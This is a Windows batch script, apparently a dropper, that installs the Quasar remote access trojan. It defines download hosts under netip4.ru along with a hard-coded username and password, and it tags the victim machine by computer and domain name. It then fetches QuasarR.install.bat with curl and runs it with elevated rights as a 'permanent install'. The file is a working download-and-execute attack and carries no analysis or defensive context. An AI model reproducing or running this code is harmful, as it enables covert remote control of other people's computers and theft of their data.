@echo on
rem *******************************************************
rem nit-QUASAR-remote-RAT.bat
rem This Script Runs Computer - Independent Instructions
rem for NIT QUSAR RAT Packets (Permanent Install)
rem
rem RETURNS:	0 if success
rem		1 if error occur
rem
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=TEMPLATE
set FIRM_NAME=NIT

rem
rem Set Directories Path
set PATHCMD=%SystemRoot%\System32
set PATHCMDWOW=%SystemRoot%\SysWOW64
set UTIL=c:\Util
set NITSYS=C:\NIT.SYSUPDATE
set PUB1=C:\pub1
set AdminT=C:\Elevation
set TEMPPUB=c:\pub1\Distrib
set UTILPUB=C:\pub1\Util
set ZLOVRED=%TEMPPUB%\Zlovred
set curdirforurl=%CD%
set LIBWSF=%TEMPPUB%\LIB\LIB-WSF
set LIBBAT=%TEMPPUB%\LIB\LIB-BAT
set NITUSERPROFILE=C:\Users\MSSQLSR

rem Set Compilant Suffix...
rem
rem set Compilant0 = COMPUTERNAME@USERDOMAIN
set compilant0=%COMPUTERNAME%_%USERDOMAIN%
echo Compilant0 = %compilant0%
set compilant1=%COMPUTERNAME%@%USERDOMAIN%
echo Compilant1 = %compilant1%

rem Initialization Download Variables
rem
set http_pref001=http
set http_host001=file.netip4.ru
set http_port001=80
set http_dir0001=/WinUpdate/
set http_dir0000=/Exponenta/
set http_dir0003=/WinUpdate/WindowsMainUpdate/Other/
set http_echodir=/WinUpdate/InitialCommon/
set http_pref002=http
set http_host002=reverse.netip4.ru
set http_port002=80
set http_dir0000=/tmp/Files/
set http_user001=MSSQLSR
set http_pass001=Admin01234
set http_pref003=http
set http_host003=win.netip4.ru
set http_port003=80
set http_dir000301=/Clients/all-clients/bin-scripts/
set http_dir000302=/Clients/%compilant0%/

rem set CURL & WGET Variables
rem
echo Set CURL and WGET Variadles
set CURLEXE=%UTIL%\CURL.EXE
set WGETEXE=%UTIL%\wget.exe
set ELEEXE=%UTIL%\ele.exe 

rem Derivatives Variables
set host02=%http_pref002%://%http_host002%:%http_port002%%http_dir0000%
set host00301=%http_pref003%://%http_host003%:%http_port003%%http_dir000301%
set host00302=%http_pref003%://%http_host003%:%http_port003%%http_dir000302%
set LocalFolder=%ZLOVRED%
echo host02 = %host02%
echo host00301 = %host00301%
echo host00302 = %host00302%
echo Local Folder = %LocalFolder%

echo Check Integrity...
rem
if not exist %UTIL% echo %UTIL% not found && exit /b 1
if not exist %CURLEXE% echo %CURLEXE% not found && exit /b 1
if not exist %WGETEXE% echo %WGETEXE% not found && exit /b 1
rem if not exist %NITUSERPROFILE% echo %NITUSERPROFILE% not found && exit /b 1
if not exist %ELEEXE% echo %ELEEXE% not found && exit /b 1

echo set Filename  Payloads...
rem

rem Set Quasar RAT Files:
rem
set QuasarR_Install=QuasarR.install.bat
rem

echo Download Payloads...
rem
rem === Download Quasar Payloads ===
%CURLEXE% %host00301%%QuasarR_Install% -o %LocalFolder%\%QuasarR_Install%

echo == Install or Run Payloads ==
rem

rem Install Qusar Payloads ===
%ELEEXE% cmd.exe /c %LocalFolder%\%QuasarR_Install%
rem timeout /T 15

rem The End of the Script
echo Script %0 has Success Run!
exit /b 0
